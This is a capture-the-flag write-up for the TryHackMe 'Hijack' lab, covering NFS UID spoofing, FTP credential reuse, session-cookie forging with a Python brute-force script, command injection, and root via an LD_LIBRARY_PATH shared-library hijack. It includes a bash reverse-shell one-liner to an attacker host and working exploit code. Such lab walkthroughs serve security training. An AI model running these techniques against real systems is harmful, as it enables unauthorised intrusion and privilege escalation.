---
title: "Hijack"
date: 2025-03-15
image: /assets/img/tryhackme/Hijack/Hijack_image.jpg
description: Writeup of the TryHackMe-CTF Hijack
categories: [TryHackMe, Easy]
tags: [linux, python, session, ftp, nfs, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Hijack</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Misconfigs conquered, identities claimed.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/hijack">https://tryhackme.com/room/hijack</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Hijack.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.125.174
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 09:02 EDT
  Nmap scan report for 10.10.125.174
  Host is up (0.043s latency).
  Not shown: 65526 closed tcp ports (conn-refused)
  PORT      STATE SERVICE
  21/tcp    open  ftp
  22/tcp    open  ssh
  80/tcp    open  http
  111/tcp   open  rpcbind
  2049/tcp  open  nfs
  36084/tcp open  unknown
  37640/tcp open  unknown
  52249/tcp open  unknown
  54084/tcp open  unknown

  Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 21,22,80,111,2049,36084,37640,52249,54084 10.10.125.174
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 09:04 EDT
  Nmap scan report for 10.10.125.174
  Host is up (0.040s latency).

  PORT      STATE SERVICE  VERSION
  21/tcp    open  ftp      vsftpd 3.0.3
  22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
  |   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
  |_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
  80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Home
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  | http-cookie-flags: 
  |   /: 
  |     PHPSESSID: 
  |_      httponly flag not set
  111/tcp   open  rpcbind  2-4 (RPC #100000)
  | rpcinfo: 
  |   program version    port/proto  service
  |   100000  2,3,4        111/tcp   rpcbind
  |   100000  2,3,4        111/udp   rpcbind
  |   100000  3,4          111/tcp6  rpcbind
  |   100000  3,4          111/udp6  rpcbind
  |   100003  2,3,4       2049/tcp   nfs
  |   100003  2,3,4       2049/tcp6  nfs
  |   100003  2,3,4       2049/udp   nfs
  |   100003  2,3,4       2049/udp6  nfs
  |   100005  1,2,3      40387/tcp6  mountd
  |   100005  1,2,3      51830/udp   mountd
  |   100005  1,2,3      54084/tcp   mountd
  |   100005  1,2,3      57688/udp6  mountd
  |   100021  1,3,4      35889/tcp6  nlockmgr
  |   100021  1,3,4      36753/udp   nlockmgr
  |   100021  1,3,4      37640/tcp   nlockmgr
  |   100021  1,3,4      49144/udp6  nlockmgr
  |   100227  2,3         2049/tcp   nfs_acl
  |   100227  2,3         2049/tcp6  nfs_acl
  |   100227  2,3         2049/udp   nfs_acl
  |_  100227  2,3         2049/udp6  nfs_acl
  2049/tcp  open  nfs      2-4 (RPC #100003)
  36084/tcp open  mountd   1-3 (RPC #100005)
  37640/tcp open  nlockmgr 1-4 (RPC #100021)
  52249/tcp open  mountd   1-3 (RPC #100005)
  54084/tcp open  mountd   1-3 (RPC #100005)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 15.59 seconds
```
From here I proceeded the analysis port by port.

## Port 111 & 2049 Analysis

I began by searching for mountable shares and found one that looked promising:
```bash
kali@kali:~$ showmount -e 10.10.125.174
  Export list for 10.10.125.174:
  /mnt/share *
kali@kali:~$ sudo mount -t nfs 10.10.125.174: /tmp/mount/ -nolock 
kali@kali:~$ cd /tmp/mount/mnt/share
cd: permission denied: share
kali@kali:~$ ls -l /tmp/mount/mnt
total 4
drwx------ 2 1003 1003 4096 Aug  8  2023 share
```

Although I was able to mount the share, I couldn't access it because the permissions were set to a user with ID `1003`. To bypass this, I created a user with the same ID, switched to that user, and tried again:
```bash
kali@kali:~$ sudo useradd hijack -u 1003  -m -s /bin/bash
kali@kal:~$ sudo su hijack

kali@kal:/tmp/mount/mnt/share$ cat for_employees.txt
  ftp creds :

  ftpuser:[removed]
```

## Port 21 Analysis

Since I found FTP credentials in the network share, I used them to log into the FTP service:
```bash
$ ftp ftpuser@10.10.125.174
  Connected to 10.10.125.174.
  220 (vsFTPd 3.0.3)
  331 Please specify the password.
  Password: 
  230 Login successful.
  ftp> ls -al
  drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
  drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
  -rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
  -rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
  -rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
  -rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
  -rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
  ftp> get .from_admin.txt
  ftp> get .passwords_list.txt
```

The FTP server contained some interesting files, which I downloaded for further analysis:
```bash
  $ cat from_admin.txt 
  To all employees, this is "admin" speaking,
  i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

  NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.

  $ head passwords_list.txt 
  Vxb38mSNN8wxqHxv6uMX
  56J4Zw6cvz8qDvhCWCVy
  qLnqTXydnY3ktstntLGu
  [...]
  
  $ wc -l passwords_list.txt 
  150 passwords_list.txt
```

This note provided me two usernames 'admin' and 'rick'. It also mentioned a list of passwords thats users should use, which could come in handy later. Additionally, it highlighted that brute-force attempts are limited, which seemed ironic given the 150-password list.

## Port 80 Analysis

The website was relatively basic, offering register, login and administration pages. 

![Website](/assets/img/tryhackme/Hijack/thm_hijack_1.jpg)

I proceed with Gobuster to enumerate directories, but found nothing significant. I then created a test user in the sign up-section. By attempting to log in with a valid username and an incorrect password, I discovered a change in the responded error message. The message changed from `The password you entered is not valid.` to `No account found with that username.`. I enumerated valid usernames using ffuf:
```bash
$ ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -d "username=FUZZ&password=test" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.125.174/login.php -mr "The password you entered is not valid."

admin                   [Status: 200, Size: 865, Words: 167, Lines: 34, Duration: 52ms]
Admin                   [Status: 200, Size: 865, Words: 167, Lines: 34, Duration: 46ms]
ADMIN                   [Status: 200, Size: 865, Words: 167, Lines: 34, Duration: 63ms]
```

With the valid username `admin`, I performed a password brute force attack:
```bash
$ ffuf -w passwords_list.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.125.174/login.php -fs 908
```

As expected, this failed due to the brute-force protection mentioned in the FTP note:

![Login](/assets/img/tryhackme/Hijack/thm_hijack_2.jpg)

Next, I used the account I created earlier to examine the login mechanisms. I found a Base64-encoded session cookie, which I had a closer look at:

![Request](/assets/img/tryhackme/Hijack/thm_hijack_3.jpg)

Because of the URL encoding, I changed the `%3D` back to `=` and was able to decode the `base64` string:
```bash
kali@kali:~/ctf/hijack$ echo "dGVzdDpjYzAzZTc0N2E2YWZiYmNiZjhiZTc2NjhhY2ZlYmVlNQ==" | base64 -d
test:cc03e747a6afbbcbf8be7668acfebee5
```

The session cookie was created from the combination of `<<username>>:<<md5 hash of password>>`. I confirmed the hash using Crackstation, which matched the password I had set:

![Crackstation](/assets/img/tryhackme/Hijack/thm_hijack_4.jpg)

### password brute force 

Since there was no rate limit on session cookies, I wrote a script to automate the process of creating cookies and using them to authenticate with the website:
```python
url = "http://10.10.125.174/index.php"

username = "test"
password = "test123"

# md5 hash of the password
md5_password = hashlib.md5(password.encode()).hexdigest()

# base64 encoding
authentication_string = base64.b64encode(f"{username}:{md5_password}".encode())

# encode special characters
authentication_string = str(authentication_string.decode()).replace("=","%3D")

# create the authentication header
header = {
    "Cookie": f"PHPSESSID={authentication_string}"
} 

# requets to the website
response = requests.get(url=url, headers=header)

# print the response
print(response.text)
```

The script worked, returning `welcome test` instead of `welcome guest`, which confirmed the session cookie was valid:
```html
 <h1>Welcome test</h1>
```

I modified the script to brute-force the "admin" password using the previously found password list:
```python
username        = "admin"
url             = "http://10.10.125.174/administration.php"

# read the password list
with open ("passwords_list.txt", 'r') as _f:
    password_file = [l.strip() for l in _f.readlines()]

print(f"\033[96m[*] {len(password_file)} passwords found")

for password in password_file:
   
    # md5 hash of the password
    md5_password = hashlib.md5(password.encode()).hexdigest()

    # base64 encoding
    authentication_string = base64.b64encode(f"{username}:{md5_password}".encode())

    # encode special characters
    authentication_string = str(authentication_string.decode()).replace("=","%3D")

    # create the authentication header
    header = {
        "Cookie": f"PHPSESSID={authentication_string}"
    } 

    # requets to the website
    response = requests.get(url=url, headers=header)
    
    # print the response
    if "Access denied" in response.text:
        print("\033[93m[-]  access denied :", password)
    else:
        print("\033[92m[+] access granted :", password)
        break
```

The script identified the valid password for the admin:

![Admin password found](/assets/img/tryhackme/Hijack/thm_hijack_5.jpg)

After logging in as admin, I discovered a `service status checker`:

![Service Status Checker](/assets/img/tryhackme/Hijack/thm_hijack_6.jpg)

I tried to break out the command syntax to execute additional commands, and was successful by contacting the two commands using `&&`: 

![Command injection](/assets/img/tryhackme/Hijack/thm_hijack_7.jpg)

Since I was able to execute arbitrary commands, I was able to execute a reverse shell and received the connection. 
```bash
ssh && bash -c "bash -i >& /dev/tcp/[attackerip]}/9001 0>&1"
```

I wasn't able to retrieve the user flag, so needed to escalate my privileges to Rick first:
```bash
www-data@Hijack:/home/rick$ cat user.txt
cat: user.txt: Permission denied
```

## Privilege Escalation rick

I continued by enumerating the machine and discoverd an interesting PHP script, named `conf.php` in the webserver directory: 
```bash
www-data@Hijack:/var/www/html$ ls
administration.php  config.php  index.php  login.php  logout.php  navbar.php  service_status.sh  signup.php  style.css
www-data@Hijack:/var/www/html$ cat config.php 
<?php
$servername = "localhost";
$username = "rick";
$password = "[removed]";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
```

Using the password I found, I was able to switch to the user Rick and retrieve the user flag.
```bash
www-data@Hijack:/var/www/html$ su rick
  Password: 
rick@Hijack:/var/www/html$ cd /home/rick/
rick@Hijack:~$ cat user.txt 
  THM{[removed]}
```

## Privilege Escalation root

I started by running `sudo -l` and received the following output:
```bash
rick@Hijack:~$ sudo -l
  [sudo] password for rick: 
  Matching Defaults entries for rick on Hijack:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH

  User rick may run the following commands on Hijack:
      (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

There where two notable points in the output. First, it indicates that we could manipulate dynamic libraries that get executed. Second, we could execute a binary as root. To exploit this, I checked which libraries were loaded when `apache2` was executed by using `ldd`: 
```bash   
rick@Hijack:/tmp$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007ffe5f389000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f27a7146000)
        libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007f27a6f1f000)
        libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007f27a6ced000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f27a6ad0000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f27a6706000)
        libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f27a64ce000)
        libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f27a62a5000)
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f27a60a0000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f27a5e9c000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f27a765b000)
```

Next, I needed to create a script, for example, called `exploit.c`, with the following content:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
	unsetenv("LD_LIBRARY_PATH");
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```

I compiled it by using `gcc`. It's important to name the output file after one of the dynamic libraries from `ldd` output. I chose the last one, `libdl.so.2`, and compiled it with the `-shared` flag to create a new dynamic library. Finally, I was able to run `apache2` with the specified `LD_LIBRARY_PATH`:
```bash
rick@Hijack:/tmp$ gcc -o /tmp/libdl.so.2 -shared -fPIC exploit.c
rick@Hijack:/tmp$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

At this point, I gained root privileges and was able to retrieve the root flag:
```bash
root@Hijack:/root# cd /root
root@Hijack:/root# cat root.txt 

██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

THM{[removed]}
```

solved! :)